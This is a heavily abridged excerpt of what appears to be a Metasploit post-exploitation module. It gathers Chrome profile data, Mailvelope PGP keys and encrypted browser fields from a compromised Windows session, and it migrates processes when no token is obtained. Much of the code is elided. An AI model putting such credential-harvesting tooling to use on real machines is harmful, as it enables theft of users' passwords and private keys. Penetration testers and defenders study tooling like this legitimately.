...
class MetasploitModule < Msf::Post
  ...
  def extension_mailvelope_parse_key(data)
    data.delete("\x00").tr("[]", "").gsub("\\r", "").delete("\"").gsub("\\n", "\n")
  end
  ...
  def process_files(username)
    ...
    @chrome_files.each do |item|
      parse_prefs(username, item[:raw_file]) if item[:in_file] == "Preferences"
      ...
      rows.map! do |row|
        ...
        next unless item[:encrypted_fields] && session.sys.config.getuid != "NT AUTHORITY\\SYSTEM"
  ...
  def extract_data(username)
    ...
    raw_files.each_pair do |raw_key, raw_path|
      @chrome_files.each do |item|
        item[:raw_file] = raw_path if item[:in_file] == raw_key
      end
    end
  ...
  def run
    ...
    migrate_success = migrate if !got_token && datastore["MIGRATE"]
